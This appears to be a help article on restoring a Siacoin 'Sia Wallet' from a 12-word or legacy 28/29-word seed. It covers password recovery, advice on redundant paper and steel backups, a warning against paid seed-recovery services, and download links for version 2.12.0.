# Recovering a Sia Wallet From an Old Seed (2017-Era Formats and Beyond)

Threads asking for help recovering a Sia wallet from an old seed have been a recurring feature of r/siacoin for years — sometimes a seed from 2017 that doesn't match any current format, sometimes just uncertainty about which recovery path applies. This covers all three scenarios honestly, including the one with no happy ending.

## First, figure out which scenario you're in

- **You have your current 12-word seed** → standard restore, covered below.
- **You've forgotten your password but have the seed** → the seed is your actual recovery mechanism; skip to the password section.
- **You have an old 28 or 29-word seed** → that's a legacy Sia-UI-era seed, not a 12-word BIP39 seed. It needs migration, not restoration — see the dedicated migration guide, linked below.
- **You've genuinely lost the seed** → read the honest section at the end before spending money on anything claiming to help.

## Standard restore from a 12-word seed

1. Install Sia Wallet on the recovery machine.
2. On the welcome screen, choose "Restore from 12-word seed" (not "Create new wallet").
3. Type your 12 words in order into the input grid. Each word is validated live against the BIP39 wordlist — a highlighted word usually means a spelling mismatch, since a single wrong letter invalidates the whole seed.
4. Set a new password for this install — it's unrelated to whatever password you used originally, since the wallet file is being recreated from scratch.
5. Wait for sync. In lite mode this typically takes a few seconds to under a minute; your full balance and transaction history reappear once it reaches "Synced."

## Forgotten your password but have the seed?

This is the easy case, even though it doesn't feel like it. Sia Wallet is non-custodial — there's no central "reset password" service, because no one but you holds the wallet file or its encryption key. But you don't need one: your seed is the actual master key, and the password is just a local encryption layer on top of it. Install fresh, restore from your seed using the steps above, and set a new password you'll remember. Same addresses, same balance, same history — just a new password.

## Have an old 28/29-word seed instead?

That's not a "forgotten password" situation or a standard restore — it's a legacy Sia-UI seed from before the Sia v2 hardfork, and it needs the [dedicated migration assistant](migrate-legacy-sia-ui-seed.md) rather than the restore flow.

## Why recovery threads are so common in the first place

A pattern worth noticing across years of these threads: the failure almost never happens at the moment of writing the seed down. It happens months or years later, when the paper has moved, a computer has been replaced, or the person doing the recovering isn't the same person who did the original setup. Seeds are simple to write down correctly and surprisingly easy to lose track of over a long enough time horizon — precisely because a working wallet doesn't remind you the backup exists until the day you need it. That gap between "backed up correctly" and "still findable years later" is the actual failure mode behind most recovery requests, more often than any flaw in the backup itself.

That's also the practical argument for redundancy over cleverness: two boring, physically separate paper (or paper-plus-steel) copies, stored somewhere you'll still remember in five years, consistently outperforms more elaborate schemes — encrypted digital backups, split-seed schemes, memorized-only approaches — that are more failure-prone precisely because they're more complicated to execute correctly and to explain to whoever might need to help you recover later.

## Lost the seed entirely

Before accepting the loss, actually check: any secure notes app on any device you've used, any encrypted backup drive, any offsite paper backup you might have forgotten about, any steel backup plate from a previous setup. A surprising number of "lost" seeds turn up on the second or third search. If the wallet is still installed somewhere and you remember the password, you can open it and re-record the seed from Settings → Security → Show Recovery Seed immediately.

If none of that works, here's the straight answer: no wallet software can recover a lost seed, including this one. Nothing about self-custody comes with a support-ticket-based fallback — that's the actual trade for nobody else being able to touch your coins either. Any service claiming to recover a lost crypto seed for a fee is targeting exactly this moment, and none are legitimate. The coins still exist on the blockchain; they're simply at an address no one can currently sign for.

For future wallets, back up your seed twice, in two physically separate locations — paper plus a fire/water-resistant steel plate is a common pairing.

**[Download Sia Wallet v2.12.0](https://github.com/Sia-Developments/SiaWallet/releases/tag/v2.12.0)** for [Windows](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.exe), [macOS](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.dmg), or [Linux](https://github.com/Sia-Developments/SiaWallet/releases/download/v2.12.0/siawallet-2.12.0.zip).

---

**Related:** [Migrating a legacy 28/29-word Sia-UI seed](migrate-legacy-sia-ui-seed.md) · [Setting up Sia Wallet for the first time](how-to-set-up-sia-wallet-first-time.md) · [Sia Wallet troubleshooting guide](sia-wallet-troubleshooting-guide.md) · [Watch-only and cold-storage setup](siacoin-watch-only-cold-storage-setup.md)
